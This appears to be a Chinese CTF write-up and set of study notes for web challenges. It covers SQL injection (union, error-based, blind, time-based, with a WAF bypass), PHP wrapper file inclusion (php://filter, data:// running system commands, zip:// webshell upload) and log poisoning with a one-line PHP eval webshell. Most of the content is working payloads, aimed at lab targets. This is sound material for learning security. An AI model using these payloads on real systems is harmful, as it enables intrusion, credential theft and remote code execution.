+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接套用语句</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>爆表中的字段</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名即可</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">#或者指定当前数据库名</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>爆相应字段的所有数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名和字段名</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(`id`,&#x27;:&#x27;,`username`,&#x27;:&#x27;,`password`) from users --+</span><br><span class="line">#字段值不加反引号也可以</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
+
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p> 报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
+<ul>
+<li><strong>group by 重复键冲</strong></li>
+</ul>
+<p>提交如下，获取数据库名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>extractvalue()函数</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库名字</p>
+<ul>
+<li><p><strong>updatexml() 函数</strong></p>
+<p>  语法如下：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(&#x27;^&#x27;,(需要查询的内容),&#x27;^&#x27;),1)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>获取数据库的名字</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库中表的名字</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select table_name from information_schema.tables where table_schema=database() ),&#x27;^&#x27;),1) --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">-- 只显示第0行的下一行，不包括第0行</span><br><span class="line">-- 如果是limit 1，1则是只显示第一行的下一行也就是第二行</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆表中的字段</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select column_name from information_schema.columns where table_name=&#x27;表名&#x27; and table_schema=database() limit 0,1 ),&#x27;^&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆字段中的内容</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;^&#x27;),1) --+</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p> 布尔盲注，即在页面没有错误回显时完成的注入攻击。</p>
+<p>构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。</p>
+<ol>
+<li><strong>判断数据库类型</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 判断是否是 Mysql数据库      information_schema.tables</span><br><span class="line">1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line"></span><br><span class="line">-- 判断是否是 access数据库      msysobjects</span><br><span class="line">1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line"></span><br><span class="line">-- 判断是否是 Sqlserver数据库   sysobjects</span><br><span class="line">1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>判断当前数据库名</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"> </span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"> </span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>判断当前库的表名</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个表的长度</span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>判断表的字段</li>
+</ol>
+<ul>
+<li>判断字段个数</li>
+<li>判断每个字段的长度</li>
+<li>猜每个字段的字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line">  </span><br><span class="line">1：判断表中字段的个数</span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个字段的长度</span><br><span class="line">//判断第一个字段的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>爆表中的字段</strong></li>
+</ol>
+<ul>
+<li>猜字段中数据的长度</li>
+<li>猜字段数据的每个字符ascii码 得字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line">1: 判断数据的长度</span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"> </span><br><span class="line">2：判断数据的ascii值</span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
+
+<h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><p>当页面既没有会先数据库内容，又没有报错信息也没有布尔类型状态时就可以采用延时注入。</p>
+<ol>
+<li><strong>延时注入</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5) --+    </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241019173504232.png" alt="image-20241019173504232"></p>
+<ol start="2">
+<li><strong>获取数据库名字</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x3D;&#x3D;if(expr1,expr2,expr3)    如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值&#x3D;&#x3D;</strong></p>
+<p>代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。</p>
+<p>与盲注类似后面就是猜数</p>
+<p><strong>&#x3D;&#x3D;可以绕waf的payload&#x3D;&#x3D;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select*from(select+sleep(4))a/**/union/**/select+1)=&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h5><p>TTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/c0b65deaa50f811b943a1c1e1395ec7d.png" alt="img"></p>
+<hr>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028/article/details/114325805</a></p>
+<p>(本文全文参考上述文章，整理一些片段只是为了自己方便学习并记录一些知识，写参考文章的师傅写的特别好，值得反复品鉴，本人无任何抄袭意愿orz)</p>
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+<li>在用户名中输入万能账号**&#x3D;&#x3D;a’ or true #&#x3D;&#x3D;**，密码随便输入</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015115613983.png" alt="image-20241015115613983"></p>
+<p>有回显，证明存在注入点</p>
+<ul>
+<li>再来测试表的字段个数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; or ture order by 3#</span><br><span class="line">-- 发现输入3时有回显输入4时无回显，即该表有三个字段</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>测试回显位置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p>输入为上时回显为：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015121046962.png" alt="image-20241015121046962"></p>
+<p>证明2为回显点</p>
+<ul>
+<li>爆当前数据库名字</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015121220576.png" alt="image-20241015121220576"></p>
+<p>得到当前数据库的名字为web2</p>
+<ul>
+<li>爆表名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;web2&#x27;), 3 #</span><br><span class="line">-- 也可以写成：</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#</span><br><span class="line">-- 列数：这个查询返回了 三个列：</span><br><span class="line">-- 第一个列是常量 1</span><br><span class="line">-- 第二个列是 group_concat(table_name)</span><br><span class="line">-- 第三个列是常量 3</span><br><span class="line">-- 在 SQL 中，FROM 子句之后的内容必须组成完整的查询。如果在 FROM 之后想要引入一个新的列（如 3），必须在查找的列中声明，否则会造成语法不正确。</span><br></pre></td></tr></table></figure>
+
+<p>得到表名flag和user</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015122711662.png" alt="image-20241015122711662"></p>
+<ul>
+<li>爆表中的字段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#只需指定表名即可</span><br><span class="line">a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;; #</span><br><span class="line">#或者指定当前数据库名</span><br><span class="line">a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;web2&#x27; and table_name=&#x27;flag&#x27;; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015123015203.png" alt="image-20241015123015203"></p>
+<p>发现只有名为flag的一列</p>
+<ul>
+<li>获取flag</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,(select flag from flag),3 #</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015123128047.png" alt="image-20241015123128047"></p>
+<p>(flag是动态的，需要实时获取)</p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>这道题主要考察了php伪协议，下面先简单讲讲php伪协议</p>
+<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>php伪协议也是php支持的协议和封装协议。</p>
+<p>常用的伪协议有：</p>
+<ul>
+<li><p>php:&#x2F;&#x2F;filter 读取文件源码 （协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码）</p>
+</li>
+<li><p>php:&#x2F;&#x2F;input 任意代码执行;这种伪协议用于读取原始的 HTTP POST 数据，可以用于处理上传的文件和表单数据。</p>
+</li>
+<li><p>data:&#x2F;&#x2F;text&#x2F;plain 任意代码执行</p>
+</li>
+<li><p>zip:&#x2F;&#x2F; 配合文件上传开启后门</p>
+</li>
+</ul>
+<p>使用条件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/4848062e74e28ad2cead15478275de1d.jpeg" alt="img"></p>
+<h5 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">作用：</span><br><span class="line"></span><br><span class="line">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php：//input，</span><br><span class="line">php://filter用于读取源码，php://input用于执行php代码。</span><br><span class="line">说明</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h5><p>读取文件源码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/37b803f9ec8c865a84fb58999da898e6.jpeg" alt="img"></p>
+<p>当访问<strong>flag.php</strong> 发现是空白的，就可以尝试考虑伪协议文件包含，构造<strong>payload</strong>，然后返回<strong>base</strong>在解码就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filter=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h5><p>当观察到include函数时，就可以使用<strong>php:&#x2F;&#x2F;input伪协议</strong></p>
+<p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据,配合文件包含漏洞可以将<strong>post</strong>请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当<strong>enctype&#x3D;multipart&#x2F;form-data</strong>时,<strong>php:&#x2F;input</strong>将会无效</p>
+<p>如本题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015214048932.png" alt="image-20241015214048932"></p>
+<p>使用burp进行抓包，发送如下请求显示所有文件名，得到的回显如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015214438946.png" alt="image-20241015214438946"></p>
+<p>所以现在知道了存在ctf_go_go_go文件和index.php文件，再在url中输入如下内容即能够得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015214935435.png" alt="image-20241015214935435"></p>
+<h5 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h5><p>协议格式: data:资源类型;编码,内容</p>
+<p>其原理和用法跟<strong>php:&#x2F;&#x2F;input</strong>类似，但是是发送<strong>GET</strong>请求参数</p>
+<p>data:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?php system(&#x27;id&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果这里需要传一个叫url的参数，并且会获取参数的文件内容进行比较时就可以采用此代码，如果进行了过滤的话还可以采取base64转码防止过滤，代码格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data://text/plain;base64,base64转码后的内容</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h5><p><strong>zip:&#x2F;&#x2F;<strong>协议用来读取压缩包中的文件,可以配合文件上传开启后门,获取</strong>webshell</strong></p>
+<p>将<strong>shell.txt</strong>压缩成zip,再将后缀名改为<strong>jpg</strong>上传至服务器,再通过<strong>zip</strong>伪协议访问压缩包里的文件,从而链接木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=zip://shell.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/IDHALASHAO/article/details/130368938">https://blog.csdn.net/IDHALASHAO/article/details/130368938</a></p>
+<p>（本篇笔记参考于上述文章，大佬的文章令我受益良多，该篇笔记仅仅只是为了学习记录以及方便本人理解，绝无抄袭之意orz）</p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>与web3形式相差无几，使用php:&#x2F;&#x2F;input发现报错显示error，发现服务器为<strong>nginx</strong>，那就可以尝试下访问日志文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241015223105676.png" alt="image-20241015223105676"></p>
+<p>默认<strong>nginx</strong>日志路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>默认<strong>Apache</strong>日志路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>进入日志页面，发现出现了UA相关信息，联想到日志中的代码会被执行，于是在UA处添加一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
